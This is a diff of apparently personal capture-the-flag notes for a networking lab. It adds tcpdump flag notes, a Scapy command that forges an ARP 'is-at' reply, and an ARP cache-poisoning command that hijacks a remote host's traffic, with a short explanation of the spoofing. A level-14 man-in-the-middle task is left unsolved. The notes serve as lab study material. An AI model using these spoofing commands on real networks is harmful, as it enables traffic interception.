@@ -186,6 +186,9 @@ tcpdump -X -i eth0 'port 123'
 tcpdump -A -i eth0 'port 123'
 #-A: Print each packet (minus its link level header) in ASCII.  Handy for capturing web pages.
 #-i: interface
+#-l: Line-based output
+#-XX: Print out the data for each package in hexadecimal and ASCII format
+#-r: read from a file
 ```
 
 level6: **monitor slow traffic from a remote host** 
@@ -275,7 +278,7 @@ sendp(Ether(src=get_if_hwaddr("eth0")) / IP(dst="10.0.0.3") / TCP(sport=31337,dp
 
 level11: **perform a Transmission Control Protocol handshake. The initial packet should have `TCP sport=31337, dport=31337, seq=31337` and should occur with the remote host at `x.0.0.3`.**
 
-```
+```shell
 tmux
 #ctrl+b,and c:add one terminal
 #ctrl+b,and n:change to another terminal
@@ -301,3 +304,38 @@ sendp(Ether(src=get_if_hwaddr("eth0")) / IP(dst="10.0.0.3") / TCP(sport=31337,dp
 ```
 
 level12: **manually send an Address Resolution Protocol packet.The packet should have `ARP op=is-at` and correctly inform the remote host of where the sender can be found**
+
+```shell
+sendp(Ether(src=get_if_hwaddr("eth0")) / ARP(op="is-at",hwsrc=get_if_hwaddr("eth0"),psrc="x.0.0.2",pdst="x.0.0.3"),iface="eth0")
+#op:who-is, is-at
+#get the flag
+```
+
+level13: **hijack traffic from a remote host. You do not have the capabilities of a NET ADMIN.The remote host at `x.0.0.4` is communicating with the remote host at `x.0.0.2` on port `123`**
+
+```shell
+scapy
+sendp(Ether(src=get_if_hwaddr("eth0")) / ARP(op="is-at",hwsrc=get_if_hwaddr("eth0"),psrc="x.0.0.2",pdst="x.0.0.4"),iface="eth0")
+#get the flag
+```
+
+Process: **we can see the arp cache using the command 'arp -a' and the arp cache will update at regular intervals**
+
+```
+x.0.0.4 --- who-has x.0.0.2 says x.0.0.4 --->BROADCAST
+x.0.0.2 ---> x.0.0.2 is-at aa:bb:cc:dd:ee:ff ---> x.0.0.4
+
+ARP CACHE
+60s starting now: x.0.0.2 is-at aa:bb:cc:dd:ee:ff
+
+x.0.0.4 --- S --> x.0.0.2
+x.0.0.2 --- SA -> x.0.0.4
+x.0.0.4 --- A --> x.0.0.2
+x.0.0.4 --- FLAG --> x.0.0.2
+
+We need to forge arp packets to x.0.0.4, update the arp cache
+```
+
+level14: **man in the middle traffic between two remote hosts and inject extra traffic. The remote host at `x.0.0.4` is communicating with the remote host at `x.0.0.3` on port `123`.**
+
+trying....
